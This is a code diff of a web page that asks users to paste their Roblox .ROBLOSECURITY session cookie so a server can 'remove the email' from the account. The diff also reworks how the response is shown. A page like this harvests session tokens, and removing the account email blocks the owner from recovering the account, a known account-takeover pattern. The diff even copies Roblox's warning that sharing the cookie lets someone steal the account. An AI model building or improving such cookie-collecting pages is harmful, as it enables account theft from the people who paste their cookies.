@@ -59,7 +59,7 @@
     <h2>Remove Email from Roblox</h2>
     <form id="removeForm">
       <label for="cookieInput">Paste your .ROBLOSECURITY cookie:</label>
-      <textarea id="cookieInput" rows="4" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."></textarea>
+      <textarea id="cookieInput" rows="4" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"></textarea>
       <button type="submit">Remove Email</button>
     </form>
     <div class="result" id="result"></div>
@@ -80,10 +80,20 @@
         });
 
         const data = await res.json();
-        if (data.success) {
-          resultDiv.textContent = `✅ ${data.message}`;
+        if (data.error) {
+          if (data.error === 'Request failed') {
+            // Handle retry logic here
+            resultDiv.textContent = `❌ Request failed: ${data.raw}`;
+          } else {
+            resultDiv.textContent = `❌ Failed: ${data.error || 'Unknown error'}`;
+          }
         } else {
-          resultDiv.textContent = `❌ Failed: ${data.error || 'Unknown error'}`;
+          if (data.csrfToken) {
+            // Handle CSRF token logic here
+            resultDiv.textContent = `✅ ${data.message}`;
+          } else {
+            resultDiv.textContent = `✅ ${data.success ? 'Email successfully removed' : 'Failed to remove email'} ${data.message}`;
+          }
         }
       } catch (err) {
         resultDiv.textContent = `❌ Request failed: ${err.message}`;
